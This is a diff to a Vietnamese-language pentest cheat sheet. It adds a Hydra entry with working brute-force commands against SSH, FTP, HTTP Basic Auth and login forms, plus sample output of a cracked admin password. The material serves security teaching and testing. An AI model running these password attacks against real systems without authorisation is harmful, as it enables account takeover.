@@ -13,7 +13,7 @@
 | [**Crontab**](#crontab) | Lập lịch tác vụ định kỳ | `-e` (chỉnh sửa lịch cron), `-l` (liệt kê lịch cron) | `crontab -e` (Mở crontab để chỉnh sửa lịch trình) |
 | [**sqlite3**](#sqlite3) | Tương tác với cơ sở dữ liệu SQLite | `.tables` (hiển thị các bảng), `.schema` (xem cấu trúc bảng) | `sqlite3 mydb.db` (Mở cơ sở dữ liệu SQLite có tên mydb.db) |
 | [**LinEnum**](#linenum) | Công cụ kiểm tra quyền và cấu hình bảo mật trên hệ thống Linux | Không có cờ đặc biệt, chạy với quyền root để có kết quả đầy đủ | `./LinEnum.sh` (Chạy script LinEnum để thu thập thông tin hệ thống) |
-
+| [**Hydra**](#hydra) | Công cụ brute-force dùng để tấn công mật khẩu dịch vụ từ xa | `-l` (tên người dùng), `-P` (wordlist mật khẩu), `-t` (số luồng), `-s` (cổng) | `hydra -l admin -P passwords.txt ssh://10.10.10.10` (Brute-force dịch vụ SSH với người dùng "admin" và wordlist mật khẩu) |
 
 ## chmod
     Mục đích: Đặt quyền truy cập cho file/thư mục (ai được đọc/ghi/thực thi).
@@ -314,3 +314,77 @@ Dưới đây là một ví dụ về đầu ra của LinEnum khi chạy kiểm 
 
 Ngoài ra, LinEnum có thể cung cấp các thông tin về các tác vụ cron, quyền truy cập tệp nhạy cảm, và nhiều thông tin hữu ích khác giúp bạn xác định được các lỗ hổng bảo mật trong hệ thống.
 
+## Hydra
+
+
+**Hydra** là một công cụ brute-force mạnh mẽ và linh hoạt dùng để tấn công mật khẩu trên các dịch vụ từ xa. Nó hỗ trợ nhiều giao thức như SSH, FTP, HTTP, SMTP, SMB, và nhiều dịch vụ khác. **Hydra** là một lựa chọn phổ biến cho các bài kiểm tra bảo mật và thâm nhập hệ thống.
+
+### **Chức năng của Hydra**
+
+Hydra có thể được sử dụng để brute-force (tấn công bạo lực) các dịch vụ khác nhau bằng cách thử các kết hợp tên người dùng và mật khẩu từ các tệp wordlist. Đây là một công cụ hữu ích trong việc kiểm tra tính mạnh mẽ của mật khẩu và phát hiện những tài khoản sử dụng mật khẩu yếu.
+
+Hydra hỗ trợ nhiều giao thức và dịch vụ, bao gồm:
+- **SSH** (Remote shell access).
+- **FTP** (Truy cập tệp từ xa).
+- **HTTP(S)** (Giao thức web, bao gồm Basic Auth và Form Auth).
+- **SMTP** (Gửi mail).
+- **RDP** (Remote Desktop Protocol).
+- **SMB** (Dịch vụ chia sẻ tệp trên Windows).
+- Và nhiều dịch vụ khác.
+
+### **Cách sử dụng Hydra**
+
+1. **Tấn công SSH với Hydra**:
+   Ví dụ, để brute-force tên người dùng **admin** với danh sách mật khẩu từ tệp **passwords.txt** cho dịch vụ SSH trên địa chỉ IP **10.10.10.10**:
+   ```bash
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
+   ```
+   - `-l`: Chỉ định tên người dùng cần brute-force (ở đây là **admin**).
+   - `-P`: Chỉ định tệp wordlist chứa danh sách mật khẩu cần thử.
+
+2. **Tấn công HTTP Basic Auth**:
+   Tấn công brute-force Basic Authentication trên một trang web:
+   ```bash
+   hydra -l admin -P passwords.txt -t 4 http-get://example.com/login
+   ```
+   - `-t 4`: Số lượng luồng thực hiện brute-force (ở đây là 4 luồng).
+
+3. **Brute-force với danh sách tên người dùng và mật khẩu**:
+   Bạn cũng có thể brute-force với cả danh sách tên người dùng và mật khẩu:
+   ```bash
+   hydra -L usernames.txt -P passwords.txt ssh://10.10.10.10
+   ```
+   - `-L`: Tệp chứa danh sách tên người dùng cần thử.
+   - `-P`: Tệp chứa danh sách mật khẩu.
+
+4. **Tấn công dịch vụ FTP**:
+   Tấn công brute-force dịch vụ FTP với danh sách tên người dùng và mật khẩu:
+   ```bash
+   hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10
+   ```
+
+### **Các tùy chọn quan trọng của Hydra**
+- **-l**: Chỉ định một tên người dùng duy nhất.
+- **-L**: Chỉ định tệp danh sách tên người dùng.
+- **-P**: Chỉ định tệp danh sách mật khẩu.
+- **-t**: Số lượng luồng đồng thời.
+- **-s**: Chỉ định cổng dịch vụ (ví dụ: **-s 2222** cho SSH trên cổng 2222).
+- **-f**: Dừng lại sau khi tìm được một cặp tên người dùng và mật khẩu hợp lệ.
+- **-V**: Hiển thị các cặp tên người dùng và mật khẩu đang thử.
+
+### **Ví dụ về tấn công HTTP Form với Hydra**
+Khi trang web có form đăng nhập, bạn cần chỉ định phương thức form HTTP với Hydra. Ví dụ sau sẽ brute-force một trang form đăng nhập:
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+```
+- `/login.php`: Đường dẫn đến form đăng nhập.
+- `username=^USER^&password=^PASS^`: Cấu trúc của form với các trường **username** và **password**.
+- `F=incorrect`: Thông báo lỗi khi đăng nhập thất bại (ở đây là "incorrect").
+
+### **Ví dụ kết quả của Hydra**
+Dưới đây là kết quả khi brute-force thành công một dịch vụ SSH:
+```bash
+[DATA] attacking ssh://10.10.10.10:22/
+[22][ssh] host: 10.10.10.10   login: admin   password: password123
+```
+Kết quả này cho thấy Hydra đã tìm thấy tài khoản hợp lệ với tên người dùng **admin** và mật khẩu **password123** cho dịch vụ SSH.
